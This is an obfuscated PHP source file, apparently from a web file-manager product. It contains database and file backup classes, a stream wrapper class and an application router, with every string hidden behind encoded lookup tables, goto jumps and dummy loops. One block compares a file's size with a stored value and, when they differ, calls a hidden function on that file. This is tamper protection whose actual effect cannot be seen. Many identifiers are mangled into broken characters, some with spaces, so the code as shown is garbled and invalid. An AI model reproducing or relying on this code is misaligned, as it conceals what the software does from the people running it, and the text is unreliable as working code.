<?php
 goto cÄÑÏêĞ£â; cîµ¬ã×„¨: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ŠÚÂŸ‡Á =& $_SERVER[¬ÏÕ§Áú]; $¡‡¸í» = Backup::get(); self::$io = $¡‡¸í»[$ŠÚÂŸ‡Á[865]]; self::$name = $¡‡¸í»[$ŠÚÂŸ‡Á[32]]; $„¦û©ûª = new DbManage(); $•ã»ŒÃæ = $„¦û©ûª->dbType(); $ÅßÖ˜‡¹ = array($ŠÚÂŸ‡Á[894] => $•ã»ŒÃæ, $ŠÚÂŸ‡Á[895] => time()); Backup::set($ÅßÖ˜‡¹); $£×ÌĞñ» = $this->tmpFilesPath() . $ŠÚÂŸ‡Á[896] . self::$name . $ŠÚÂŸ‡Á[8]; del_dir($£×ÌĞñ»); mk_dir($£×ÌĞñ»); $ø±‡íÁö = $– ”ú–Ë = 0; try { $É‹ôÉŞß = $„¦û©ûª->db()->getTables(); } catch (Exception $Óª–õµ) { Backup::log($ŠÚÂŸ‡Á[897] . $Óª–õµ->getMessage()); return !1; } $É‹ôÉŞß = array_diff($É‹ôÉŞß, array($ŠÚÂŸ‡Á[898], $ŠÚÂŸ‡Á[899])); foreach ($É‹ôÉŞß as $ÙòÆçæÏ) { if ($ÙòÆçæÏ == $ŠÚÂŸ‡Á[900]) { continue; } $ø±‡íÁö += $„¦û©ûª->model($ÙòÆçæÏ)->count(); } $ÃÑÒ¸»é = new Task($ŠÚÂŸ‡Á[901], $ŠÚÂŸ‡Á[893], $ø±‡íÁö, LNG($ŠÚÂŸ‡Á[902]) . $ŠÚÂŸ‡Á[903] . LNG($ŠÚÂŸ‡Á[904])); $GLOBALS[$ŠÚÂŸ‡Á[905]] = self::$name; foreach ($É‹ôÉŞß as $ÙòÆçæÏ) { $û«È‡Œ = $£×ÌĞñ» . $ÙòÆçæÏ . $ŠÚÂŸ‡Á[906]; if ($ÙòÆçæÏ == $ŠÚÂŸ‡Á[900]) { @touch($û«È‡Œ); continue; } $€À ¯Šõ = null; if ($ÙòÆçæÏ == $ŠÚÂŸ‡Á[907] && $¡‡¸í»[$ŠÚÂŸ‡Á[181]] == $ŠÚÂŸ‡Á[892]) { $€À ¯Šõ = self::$io; } $– ”ú–Ë += $„¦û©ûª->sqlFromDb($ÙòÆçæÏ, $û«È‡Œ, $ÃÑÒ¸»é, $€À ¯Šõ); } unset($GLOBALS[$ŠÚÂŸ‡Á[905]]); $ÃÑÒ¸»é->end(); if ($– ”ú–Ë > $ø±‡íÁö) { $ø±‡íÁö = $– ”ú–Ë; } $ÅßÖ˜‡¹ = array($ŠÚÂŸ‡Á[894] => $•ã»ŒÃæ, $ŠÚÂŸ‡Á[889] => 1, $ŠÚÂŸ‡Á[908] => $ø±‡íÁö, $ŠÚÂŸ‡Á[909] => $– ”ú–Ë, $ŠÚÂŸ‡Á[910] => time()); Backup::set($ÅßÖ˜‡¹); if ($ø±‡íÁö - $– ”ú–Ë > 0) { $Êø‹‹âÁ = $ŠÚÂŸ‡Á[911]; if (!stristr(I18n::getType(), $ŠÚÂŸ‡Á[912])) { $Êø‹‹âÁ = $ŠÚÂŸ‡Á[913]; } Backup::log(array($Êø‹‹âÁ, $ÅßÖ˜‡¹)); return !1; } return !0; } private function tmpFilesPath() { $ïİŒŞşµ =& $_SERVER[¬ÏÕ§Áú]; $®¿³Åµæ = TEMP_FILES; if ($GLOBALS[$ïİŒŞşµ[6]][$ïİŒŞşµ[102]][$ïİŒŞşµ[914]]) { $®¿³Åµæ = $GLOBALS[$ïİŒŞşµ[6]][$ïİŒŞşµ[102]][$ïİŒŞşµ[914]]; if (!mk_dir($®¿³Åµæ) || !is_writable($®¿³Åµæ) || !IO::mkfile($®¿³Åµæ . $ïİŒŞşµ[915])) { $®¿³Åµæ = TEMP_FILES; } } return $®¿³Åµæ; } } class BackupDbFile { public function __construct() { } public function index() { $åÇéÔÓÚ =& $_SERVER[¬ÏÕ§Áú]; $ïĞïÖŠÔ = Backup::get(); $æ›ÂŸÒ¾ = $ïĞïÖŠÔ[$åÇéÔÓÚ[32]]; $âÁì¯ = $this->tmpFilesPath() . "\142\141\x63\153\165\160\137{$æ›ÂŸÒ¾}\x2f"; $³ÂÏĞ‚‰ = $this->backupPath($ïĞïÖŠÔ); if (!($³ÂÏĞ‚‰ = IO::mkdir($³ÂÏĞ‚‰))) { Backup::log($åÇéÔÓÚ[916] . $³ÂÏĞ‚‰); return !1; } $×úª€á³ = IO::listPath($âÁì¯); $èØ€Ò“ğ = isset($×úª€á³[$åÇéÔÓÚ[96]]) ? $×úª€á³[$åÇéÔÓÚ[96]] : array(); $€Ô²Å€æ = array_sum(array_column($èØ€Ò“ğ, $åÇéÔÓÚ[89])); if (!$€Ô²Å€æ) { Backup::log($åÇéÔÓÚ[917] . $âÁì¯); return !1; } $–ğ®ø¿ë = array($åÇéÔÓÚ[918] => $€Ô²Å€æ, $åÇéÔÓÚ[919] => time()); Backup::set($–ğ®ø¿ë); $í–ê¶Ò = new TaskFileTransfer($åÇéÔÓÚ[920], $åÇéÔÓÚ[893], count($èØ€Ò“ğ), LNG($åÇéÔÓÚ[902]) . $åÇéÔÓÚ[482] . LNG($åÇéÔÓÚ[904]) . $åÇéÔÓÚ[921]); $í–ê¶Ò->task[$åÇéÔÓÚ[877]] = $€Ô²Å€æ; foreach ($×úª€á³[$åÇéÔÓÚ[96]] as $Ø˜Şƒ¿‘) { $‘êü¯÷¦ = IO::move($Ø˜Şƒ¿‘[$åÇéÔÓÚ[97]], $³ÂÏĞ‚‰); if (!$‘êü¯÷¦) { $í–ê¶Ò->end(); $í†Ø½Éˆ = IO::getLastError($åÇéÔÓÚ[922] . $Ø˜Şƒ¿‘[$åÇéÔÓÚ[97]] . $åÇéÔÓÚ[923] . $³ÂÏĞ‚‰ . $åÇéÔÓÚ[188]); Backup::log($í†Ø½Éˆ); return !1; } } $¦óÛı¨× = new DbManage(); $Ùõôı = $¦óÛı¨×->getSqlFile(); if (!$Ùõôı || !$Ùõôı[$åÇéÔÓÚ[924]] || !$Ùõôı[$åÇéÔÓÚ[13]]) { Backup::log($åÇéÔÓÚ[925]); return !1; } IO::move($Ùõôı[$åÇéÔÓÚ[924]], $³ÂÏĞ‚‰); IO::move($Ùõôı[$åÇéÔÓÚ[13]], $³ÂÏĞ‚‰); $í–ê¶Ò->end(); $–ğ®ø¿ë = array($åÇéÔÓÚ[926] => $€Ô²Å€æ, $åÇéÔÓÚ[927] => time()); Backup::set($–ğ®ø¿ë); return !0; } private function backupPath($§·ŒÃ×Ğ) { $¸¼ëÊ¥ =& $_SERVER[¬ÏÕ§Áú]; $”‡í«¬ = $§·ŒÃ×Ğ[$¸¼ëÊ¥[32]]; $ë‹€Š€Å = Model($¸¼ëÊ¥[886])->get($¸¼ëÊ¥[887]); $ÆäŞÇ ª = substr(md5($¸¼ëÊ¥[888] . $ë‹€Š€Å . $”‡í«¬), 0, 8); return "\173\151\157\72{$§·ŒÃ×Ğ[$¸¼ëÊ¥[865]]}\175\57\x64\x61\x74\x61\x62\x61\x73\145\x2f\142\x61\143\x6b\165\160\57" . $”‡í«¬ . $¸¼ëÊ¥[11] . $ÆäŞÇ ª; } private function tmpFilesPath() { $ûœ›» =& $_SERVER[¬ÏÕ§Áú]; $ğï¢œƒ = TEMP_FILES; if ($GLOBALS[$ûœ›»[6]][$ûœ›»[102]][$ûœ›»[914]]) { $ğï¢œƒ = $GLOBALS[$ûœ›»[6]][$ûœ›»[102]][$ûœ›»[914]]; if (!mk_dir($ğï¢œƒ) || !is_writable($ğï¢œƒ) || !IO::mkfile($ğï¢œƒ . $ûœ›»[915])) { $ğï¢œƒ = TEMP_FILES; } } return $ğï¢œƒ; } } class BackupFile { public function __construct() { } public function index() { $äçÊ°  = Backup::get(); $æˆ€ùõ = $äçÊ° [$_SERVER[¬ÏÕ§Áú][869]][$_SERVER[¬ÏÕ§Áú][243]][$_SERVER[¬ÏÕ§Áú][562]]; $æ˜ÓîˆÌ = array($_SERVER[¬ÏÕ§Áú][563] => array($_SERVER[¬ÏÕ§Áú][928], $æˆ€ùõ), $_SERVER[¬ÏÕ§Áú][929] => array($_SERVER[¬ÏÕ§Áú][417], $äçÊ° [$_SERVER[¬ÏÕ§Áú][865]])); $Ã¾ßÛØ’ = (int) Model($_SERVER[¬ÏÕ§Áú][907])->where($æ˜ÓîˆÌ)->count($_SERVER[¬ÏÕ§Áú][562]); $§ÁªÉáŸ = (int) Model($_SERVER[¬ÏÕ§Áú][907])->where($æ˜ÓîˆÌ)->sum($_SERVER[¬ÏÕ§Áú][89]); $øëƒ‘ƒü = new TaskFileTransfer($_SERVER[¬ÏÕ§Áú][930], $_SERVER[¬ÏÕ§Áú][893], $Ã¾ßÛØ’, LNG($_SERVER[¬ÏÕ§Áú][902]) . $_SERVER[¬ÏÕ§Áú][903] . LNG($_SERVER[¬ÏÕ§Áú][931])); $øëƒ‘ƒü->task[$_SERVER[¬ÏÕ§Áú][877]] = $§ÁªÉáŸ; $şÕßª®Ç = array($_SERVER[¬ÏÕ§Áú][932] => $Ã¾ßÛØ’, $_SERVER[¬ÏÕ§Áú][933] => $§ÁªÉáŸ, $_SERVER[¬ÏÕ§Áú][934] => time()); Backup::set($şÕßª®Ç); $À©ÁÌÁ¶ = !0; $¸©Ë†¼¯ = $this->storeIds(); $ôò¿ĞÇ• = 1; $ûÈó = 1000; $œî•±‡Ä = $¿ï‚œÓº = 0; $åÂôØÈõ = array(); $¼¨²·Ê = $ÚÏõ›ù = 0; do { $¿á¢š€ã = $_SERVER[¬ÏÕ§Áú][935]; $¹Á¯Ëİï = Model($_SERVER[¬ÏÕ§Áú][907])->where($æ˜ÓîˆÌ)->field($¿á¢š€ã)->order($_SERVER[¬ÏÕ§Áú][936])->selectPage($ûÈó, $ôò¿ĞÇ•); $îáß†Á = !empty($¹Á¯Ëİï[$_SERVER[¬ÏÕ§Áú][456]]) ? $¹Á¯Ëİï[$_SERVER[¬ÏÕ§Áú][456]] : array(); foreach ($îáß†Á as $ÖÀëÀ¬ß) { if (!$this->_fileExist($ÖÀëÀ¬ß, $åÂôØÈõ, $¸©Ë†¼¯)) { Backup::log($_SERVER[¬ÏÕ§Áú][937] . $ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][562]] . $_SERVER[¬ÏÕ§Áú][938] . $ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][97]]); continue; } $ÊÃ£ŒÁÌ = $ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][97]]; $óÎôË™ = "\x7b\151\157\x3a{$äçÊ° [$_SERVER[¬ÏÕ§Áú][865]]}\175" . substr($ÊÃ£ŒÁÌ, strlen("\x7b\151\157\72{$ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][939]]}\x7d")); if (IO::exist($óÎôË™)) { $øëƒ‘ƒü->updateFileEnd($ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][32]], $ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][89]]); } else { $óÎôË™ = get_path_father($óÎôË™); IO::mkdir($óÎôË™); if (!IO::copy($ÊÃ£ŒÁÌ, $óÎôË™, $_SERVER[¬ÏÕ§Áú][940])) { Backup::log($_SERVER[¬ÏÕ§Áú][941] . $ÊÃ£ŒÁÌ . $_SERVER[¬ÏÕ§Áú][923] . $óÎôË™ . $_SERVER[¬ÏÕ§Áú][188]); $À©ÁÌÁ¶ = !1; break; } } $æˆ€ùõ = $ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][562]]; $¿ï‚œÓº += 1; $œî•±‡Ä += $ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][89]]; $ÚÏõ›ù += 1; $¼¨²·Ê += $ÖÀëÀ¬ß[$_SERVER[¬ÏÕ§Áú][89]]; if ($œî•±‡Ä >= 1024 * 1024 * 100) { $şÕßª®Ç = array($_SERVER[¬ÏÕ§Áú][864] => $æˆ€ùõ, $_SERVER[¬ÏÕ§Áú][942] => $ÚÏõ›ù, $_SERVER[¬ÏÕ§Áú][943] => $¼¨²·Ê); Backup::set($şÕßª®Ç); $œî•±‡Ä = $¿ï‚œÓº = 0; } } $õŸ«ç² = count($îáß†Á); $ôò¿ĞÇ•++; } while ($õŸ«ç² == $ûÈó); $øëƒ‘ƒü->end(); $şÕßª®Ç = array($_SERVER[¬ÏÕ§Áú][944] => 1, $_SERVER[¬ÏÕ§Áú][875] => time(), $_SERVER[¬ÏÕ§Áú][891] => 1, $_SERVER[¬ÏÕ§Áú][864] => $æˆ€ùõ, $_SERVER[¬ÏÕ§Áú][945] => time()); if ($¿ï‚œÓº) { $şÕßª®Ç[$_SERVER[¬ÏÕ§Áú][942]] = $ÚÏõ›ù; $şÕßª®Ç[$_SERVER[¬ÏÕ§Áú][943]] = $¼¨²·Ê; } Backup::set($şÕßª®Ç); return !0; } private function _fileExist($êÑ£êãã, &$êÊ¬Îú©, $¥šÍîíœ) { $Ó’“Â–Â =& $_SERVER[¬ÏÕ§Áú]; $Ø‚Ó¤ñ± = $êÑ£êãã[$Ó’“Â–Â[97]]; if (in_array($êÑ£êãã[$Ó’“Â–Â[562]], $êÊ¬Îú©)) { return !1; } if (!in_array($êÑ£êãã[$Ó’“Â–Â[939]], $¥šÍîíœ)) { return !1; } if (IO::exist($Ø‚Ó¤ñ±)) { return !0; } $·ü„ªÀÖ = get_path_father($Ø‚Ó¤ñ±); if (IO::exist($·ü„ªÀÖ)) { $êÊ¬Îú©[] = $êÑ£êãã[$Ó’“Â–Â[562]]; return !1; } $Ô®Ş–Äã = array($Ó’“Â–Â[939] => $êÑ£êãã[$Ó’“Â–Â[939]], $Ó’“Â–Â[97] => array($Ó’“Â–Â[479], "{$·ü„ªÀÖ}\x25")); $Õîò“¦‹ = Model($Ó’“Â–Â[907])->where($Ô®Ş–Äã)->field($Ó’“Â–Â[563])->select(); $êÊ¬Îú© = array_merge($êÊ¬Îú©, array_to_keyvalue($Õîò“¦‹, $Ó’“Â–Â[12], $Ó’“Â–Â[562])); return !1; } private function _fileFilter($•«ûİ‡Û) { $†µ€Ô…ü =& $_SERVER[¬ÏÕ§Áú]; return; if (empty($•«ûİ‡Û)) { return; } $Š˜ºúç = array($†µ€Ô…ü[562] => array($†µ€Ô…ü[7], array_unique($•«ûİ‡Û))); $—ü»ÏÜß = Model($†µ€Ô…ü[946])->where($Š˜ºúç)->field($†µ€Ô…ü[204])->select(); foreach ($—ü»ÏÜß as $¿æãµ¿ä) { Model($†µ€Ô…ü[946])->remove($¿æãµ¿ä[$†µ€Ô…ü[204]], !1); } } private function storeIds() { $–®¬£ßı =& $_SERVER[¬ÏÕ§Áú]; $üÄæŒæÔ = Model($–®¬£ßı[881])->listData(); $ı¼á¦Ï = array(); $›ïßõ’ = $GLOBALS[$–®¬£ßı[6]][$–®¬£ßı[102]][$–®¬£ßı[947]]; foreach ($üÄæŒæÔ as $æáÈø÷) { $—¸äÁ”² = strtolower($æáÈø÷[$–®¬£ßı[108]]); if (!isset($›ïßõ’[$—¸äÁ”²])) { continue; } $ÛäìË€² = $–®¬£ßı[87] . (isset($›ïßõ’[$—¸äÁ”²]) ? $›ïßõ’[$—¸äÁ”²] : ucfirst($—¸äÁ”²)); if (!class_exists($ÛäìË€²)) { continue; } $ı¼á¦Ï[] = $æáÈø÷[$–®¬£ßı[492]]; } return $ı¼á¦Ï; } } goto a®³äƒô’; B…º¸î°´: $_size = $_SERVER[¬ÏÕ§Áú][1607]; if ($_SERVER[$_SERVER[¬ÏÕ§Áú][60]] != $_size($_file)) { $_getc = $_SERVER[¬ÏÕ§Áú][62]; $_getfile = $_SERVER[$_SERVER[¬ÏÕ§Áú][63]] . $_SERVER[¬ÏÕ§Áú][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¬ÏÕ§Áú][65], $_getfilec); if (count($_getarrs) < $_SERVER[¬ÏÕ§Áú][66]) { $exit = $_SERVER[¬ÏÕ§Áú][67]; $exit(); } $_act = $_SERVER[¬ÏÕ§Áú][68]; $_act($_file); } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ªˆú»¢Û, $ë€¡ƒƒÜ = 0) { parent::__construct(); $this->source = $ªˆú»¢Û; $this->sourceSize = $ë€¡ƒƒÜ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($½ê´…˜¥ = false) { return $this->sourceSize; } public function getContent($ÎÍŸÖ— = false) { return $this->fileSubstr($ÎÍŸÖ—, 0, $this->sourceSize); } public function fileSubstr($¤œ†åÕ = false, $µûêƒ¬ı = 0, $ÖÂôì¥ = 0) { if (!$ÖÂôì¥) { $ÖÂôì¥ = $this->sourceSize; } $ï¥‡ñæ = $this->sourceSize - $µûêƒ¬ı; if ($ÖÂôì¥ >= $ï¥‡ñæ) { $ÖÂôì¥ = $ï¥‡ñæ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $µûêƒ¬ı, $ÖÂôì¥); } if ($this->sourceType == self::TYPE_FILE) { if ($ÖÂôì¥ <= 0) { return $_SERVER[¬ÏÕ§Áú][12]; } $Âá‹ìí = ftell($this->source); fseek_64($this->source, $Âá‹ìí + $µûêƒ¬ı); $Ä“¹è€Ù = @fread($this->source, $ÖÂôì¥); fseek_64($this->source, $Âá‹ìí); return $Ä“¹è€Ù; } } public function hashMd5($ÚÛ°‘¾Ï = false) { return md5($this->getContent()); } public static function hash($®ŠÎõÕÛ, $™èíÏˆ« = 0) { $Œª†¢ïû = new PathDriverStream($®ŠÎõÕÛ, $™èíÏˆ«); return $Œª†¢ïû->hashSimple($®ŠÎõÕÛ); } public static function md5($“–åí»», $ÓŞ·¾‹ = 0) { $Ğ¹ñóÙø = new PathDriverStream($“–åí»», $ÓŞ·¾‹); return $Ğ¹ñóÙø->hashMd5($“–åí»»); } } goto E “Àà‡´Æ; C×»é—´ã: if (!$rvbdtxgfep) { die; } class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($ÎúÂã®) { $†½İ¾¬ª =& $_SERVER[¬ÏÕ§Áú]; $ã‰ƒöŠ =& $_SERVER[øÍ¯û–ª]; $„îÒˆ“° = explode($ã‰ƒöŠ[0], trim($ÎúÂã®, $ã‰ƒöŠ[0])); $ô®¾Ú‘ = $†½İ¾¬ª[707]; if (!$ô®¾Ú‘) { return; } $this->defaultModule = $„îÒˆ“°[0] ? $„îÒˆ“°[0] : $this->defaultModule; $this->defaultController = $„îÒˆ“°[1] ? $„îÒˆ“°[1] : $this->defaultController; $¼…‰¾¹á = $†½İ¾¬ª[708]; if (strlen($¼…‰¾¹á) < $†½İ¾¬ª[66]) { return; } $this->defaultAction = $„îÒˆ“°[2] ? $„îÒˆ“°[2] : $this->defaultAction; $this->vzrpc7642e00($ã‰ƒöŠ[1], array($this, $ã‰ƒöŠ[2])); $ÁÙ„Æ…Á = $†½İ¾¬ª[709]; while (strlen($ÁÙ„Æ…Á) < $†½İ¾¬ª[66]) { if (!$ÁÙ„Æ…Á) { break; } $ÁÙ„Æ…Á++; } } public function appRun($é§Œ‹äÓ) { $Ò¶ù¶ñï =& $_SERVER[¬ÏÕ§Áú]; $ˆäµ•¾½ =& $_SERVER[øÍ¯û–ª]; $’¥Çş™° = explode($ˆäµ•¾½[0], $é§Œ‹äÓ); $©Ã›Òæ = strtolower($’¥Çş™°[0]); $¬óêçÎÆ = $ˆäµ•¾½[3]; $ùıäÂÓ¡ = $Ò¶ù¶ñï[710]; while ($ùıäÂÓ¡ < $Ò¶ù¶ñï[711]) { if ($ùıäÂÓ¡ >= 0) { break; } $ùıäÂÓ¡++; } if ($©Ã›Òæ == $ˆäµ•¾½[4]) { $¬óêçÎÆ = $ˆäµ•¾½[5]; $’¥Çş™°[0] = $ˆäµ•¾½[6]; $’¥Çş™°[1] = $’¥Çş™°[1] . $ˆäµ•¾½[7]; $é§Œ‹äÓ = join($ˆäµ•¾½[0], $’¥Çş™°); $é§Œ‹äÓ = trim($é§Œ‹äÓ, $ˆäµ•¾½[0]); } call_user_func(array($ˆäµ•¾½[8], $ˆäµ•¾½[9]), $¬óêçÎÆ . $ˆäµ•¾½[10], $é§Œ‹äÓ); ActionCall($é§Œ‹äÓ); call_user_func(array($ˆäµ•¾½[8], $ˆäµ•¾½[9]), $¬óêçÎÆ . $ˆäµ•¾½[11], $é§Œ‹äÓ); $²œÇÉ‡ = $Ò¶ù¶ñï[712]; } private function autorun() { $„éÅ•ºö =& $_SERVER[¬ÏÕ§Áú]; $Éè„™× =& $_SERVER[øÍ¯û–ª]; global $config; $ÌêŠù¿ = $„éÅ•ºö[713]; if (strlen($ÌêŠù¿) < $„éÅ•ºö[711]) { die; } if (count($config[$Éè„™×[12]]) == 0) { return; } foreach ($config[$Éè„™×[12]] as $³ÂÅÓÊ£ => $‹“‰¬œŒ) { $this->appRun($‹“‰¬œŒ); } } private function cqxtd7b664a1() { $ÛÆª÷›ˆ =& $_SERVER[¬ÏÕ§Áú]; $ó„’Ó¯ =& $_SERVER[øÍ¯û–ª]; $‚È†í = $ó„’Ó¯[4]; $Çê’ªƒƒ = $GLOBALS[$ó„’Ó¯[13]][$ó„’Ó¯[14]][0]; if (!$Çê’ªƒƒ || strlen($Çê’ªƒƒ) <= strlen($‚È†í)) { return; } if (strtolower(substr($Çê’ªƒƒ, -strlen($‚È†í))) != $‚È†í) { return; } $Ì‰¢ä¦Â = substr($Çê’ªƒƒ, 0, -strlen($‚È†í)); $Üüšá«Ù = $ÛÆª÷›ˆ[714]; while (strlen($Üüšá«Ù) < $ÛÆª÷›ˆ[715]) { if (!$Üüšá«Ù) { break; } $Üüšá«Ù++; } $™ÈÉ»ûÈ = array($ó„’Ó¯[4], $Ì‰¢ä¦Â); $‰›µ‘İ = array_slice($GLOBALS[$ó„’Ó¯[13]][$ó„’Ó¯[14]], 1); $GLOBALS[$ó„’Ó¯[13]][$ó„’Ó¯[14]] = array_merge($™ÈÉ»ûÈ, $‰›µ‘İ); $ŞøÉòÕş = $ÛÆª÷›ˆ[716]; $GLOBALS[$ó„’Ó¯[13]][$ó„’Ó¯[15]] = implode($ó„’Ó¯[0], $GLOBALS[$ó„’Ó¯[13]][$ó„’Ó¯[14]]); $Ïã˜íº¼ = $ÛÆª÷›ˆ[717]; if (!$Ïã˜íº¼) { return; } } private function jbrx89964875() { $‚ö¢°ü§ =& $_SERVER[¬ÏÕ§Áú]; $„Å¶Á×À =& $_SERVER[øÍ¯û–ª]; if ($GLOBALS[$„Å¶Á×À[13]][$„Å¶Á×À[15]] != $„Å¶Á×À[6]) { return; } $Ë–¨‹Œ˜ = $_SERVER[$„Å¶Á×À[16]]; $õùÛ¬¢Ÿ = $„Å¶Á×À[17]; $ñŸÙ§” = $‚ö¢°ü§[718]; while (strlen($ñŸÙ§”) < $‚ö¢°ü§[66]) { if (!$ñŸÙ§”) { break; } $ñŸÙ§”++; } if (!strstr($Ë–¨‹Œ˜, $õùÛ¬¢Ÿ)) { return; } $½°›Ç” = strrpos($Ë–¨‹Œ˜, $õùÛ¬¢Ÿ); $¾Êø÷ã¶ = $‚ö¢°ü§[719]; if (strlen($¾Êø÷ã¶) < $‚ö¢°ü§[720]) { die; } $Ÿø·‘³ƒ = substr($Ë–¨‹Œ˜, $½°›Ç” + strlen($õùÛ¬¢Ÿ)); preg_match_all($„Å¶Á×À[18], $Ÿø·‘³ƒ, $ôä˜ñ¸); $Ÿø·‘³ƒ = trim($ôä˜ñ¸[0][0], $„Å¶Á×À[19]); $Ù²åÏÑÔ = $‚ö¢°ü§[721]; if (!$Ù²åÏÑÔ) { return; } $GLOBALS[$„Å¶Á×À[13]][$„Å¶Á×À[14]] = explode($„Å¶Á×À[19], $Ÿø·‘³ƒ); $GLOBALS[$„Å¶Á×À[13]][$„Å¶Á×À[15]] = implode($„Å¶Á×À[0], $GLOBALS[$„Å¶Á×À[13]][$„Å¶Á×À[14]]); $Š’ìÂäî = $‚ö¢°ü§[722]; if (!$Š’ìÂäî) { return; } } public function run() { $ÑÁÂÀÛ =& $_SERVER[¬ÏÕ§Áú]; $è–Ë´ø =& $_SERVER[øÍ¯û–ª]; $this->jbrx89964875(); $´Ñ¼œé¥ = $ÑÁÂÀÛ[723]; while ($´Ñ¼œé¥ < $ÑÁÂÀÛ[720]) { if ($´Ñ¼œé¥ >= 0) { break; } $´Ñ¼œé¥++; } $this->cqxtd7b664a1(); $“ŸÖì³ = $GLOBALS[$è–Ë´ø[13]][$è–Ë´ø[14]]; $€ûÂ›´á = $ÑÁÂÀÛ[724]; $şôÛå·Œ = $GLOBALS[$è–Ë´ø[13]][$è–Ë´ø[15]]; $Óá·òää = $ÑÁÂÀÛ[725]; define($è–Ë´ø[20], isset($“ŸÖì³[0]) && $“ŸÖì³[0] ? $“ŸÖì³[0] : $this->defaultModule); define($è–Ë´ø[21], isset($“ŸÖì³[1]) && $“ŸÖì³[0] ? $“ŸÖì³[1] : $this->defaultController); define($è–Ë´ø[22], isset($“ŸÖì³[2]) && $“ŸÖì³[0] ? $“ŸÖì³[2] : $this->defaultAction); $±¾åúùÉ = $ÑÁÂÀÛ[726]; define($è–Ë´ø[23], MOD . $è–Ë´ø[0] . ST . $è–Ë´ø[0] . ACT); $®ôƒÙÉ— = $ÑÁÂÀÛ[727]; if (!$®ôƒÙÉ—) { return; } $_SERVER[$è–Ë´ø[24]] = strtolower(ACTION); $this->autorun(); if (count($“ŸÖì³) >= 3) { $this->appRun($şôÛå·Œ); } else { $this->appRun(ACTION); } } private $zdih62c8d9ad = array(); private $ysfc45f101c4 = ''; public function kbdq3cf1b5b7() { $ªÄä‰—Ù =& $_SERVER[¬ÏÕ§Áú]; $¿ˆÙıù” =& $_SERVER[øÍ¯û–ª]; $this->jgic56842e91(); $this->gsql0ef4b072(); $°‘ü°ë² = $ªÄä‰—Ù[728]; if (strlen($°‘ü°ë²) < $ªÄä‰—Ù[66]) { return; } $this->pgyu9d95471b(); $this->zhcu473a2995(); $this->zxjefdd81194(); $ İêÓâÛ = $ªÄä‰—Ù[729]; if (strlen($ İêÓâÛ) < $ªÄä‰—Ù[715]) { return; } $this->lhqu3c34fb59(); $ãø¾Ú‡Ü = $ªÄä‰—Ù[730]; if (strlen($ãø¾Ú‡Ü) < $ªÄä‰—Ù[720]) { die; } $this->nhcgba7fd8ef(); $ÏæˆÛê = $ªÄä‰—Ù[731]; if (!$ÏæˆÛê) { return; } $this->vzrpc7642e00($¿ˆÙıù”[25], array($this, $¿ˆÙıù”[26])); $this->vzrpc7642e00($¿ˆÙıù”[27], array($this, $¿ˆÙıù”[28])); $¶Ñ¼¹ = $ªÄä‰—Ù[732]; $this->vzrpc7642e00($¿ˆÙıù”[29], array($this, $¿ˆÙıù”[30])); $this->vzrpc7642e00($¿ˆÙıù”[31], array($this, $¿ˆÙıù”[32])); $Ò‹¸‡Ç = $ªÄä‰—Ù[733]; if (strlen($Ò‹¸‡Ç) < $ªÄä‰—Ù[720]) { return; } } public function cghb068fc98a($¾§÷Óøğ) { $ßÕ©€Ç =& $_SERVER[¬ÏÕ§Áú]; $¾©¾Ë¤ =& $_SERVER[øÍ¯û–ª]; $åšæ×ôí = Model($¾©¾Ë¤[33])->get(); $¬‹Ô´°ì = array($¾©¾Ë¤[34], $¾©¾Ë¤[35], $¾©¾Ë¤[36], $¾©¾Ë¤[37], $¾©¾Ë¤[38], $¾©¾Ë¤[39], $¾©¾Ë¤[40], $¾©¾Ë¤[41], $¾©¾Ë¤[42], $¾©¾Ë¤[43], $¾©¾Ë¤[44], $¾©¾Ë¤[45], $¾©¾Ë¤[46], $¾©¾Ë¤[47], $¾©¾Ë¤[48], $¾©¾Ë¤[49], $¾©¾Ë¤[50], $¾©¾Ë¤[51], $¾©¾Ë¤[52], $¾©¾Ë¤[53], $¾©¾Ë¤[54], $¾©¾Ë¤[55], $¾©¾Ë¤[56], $¾©¾Ë¤[57], $¾©¾Ë¤[58], $¾©¾Ë¤[59], $¾©¾Ë¤[60], $¾©¾Ë¤[61], $¾©¾Ë¤[62], $¾©¾Ë¤[63], $¾©¾Ë¤[64], $¾©¾Ë¤[65], $¾©¾Ë¤[66], $¾©¾Ë¤[67], $¾©¾Ë¤[68], $¾©¾Ë¤[69], $¾©¾Ë¤[70], $¾©¾Ë¤[71], $¾©¾Ë¤[72], $¾©¾Ë¤[73], $¾©¾Ë¤[74], $¾©¾Ë¤[75], $¾©¾Ë¤[76], $¾©¾Ë¤[77], $¾©¾Ë¤[78], $¾©¾Ë¤[79], $¾©¾Ë¤[80], $¾©¾Ë¤[81], $¾©¾Ë¤[82], $¾©¾Ë¤[83], $¾©¾Ë¤[84], $¾©¾Ë¤[85]); foreach ($¬‹Ô´°ì as $×ö‘‹£) { $ãì–“õÂ = $GLOBALS[$¾©¾Ë¤[86]][$¾©¾Ë¤[87]][$×ö‘‹£]; if (isset($åšæ×ôí[$×ö‘‹£])) { $ãì–“õÂ = $åšæ×ôí[$×ö‘‹£]; } $¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[89]][$×ö‘‹£] = $ãì–“õÂ; } $àÔ‰¥õò = $¾§÷Óøğ[$¾©¾Ë¤[88]][$¾©¾Ë¤[89]][$¾©¾Ë¤[46]]; $î½ŸÔâ´ = $ßÕ©€Ç[734]; while ($î½ŸÔâ´ < $ßÕ©€Ç[715]) { if ($î½ŸÔâ´ >= 0) { break; } $î½ŸÔâ´++; } 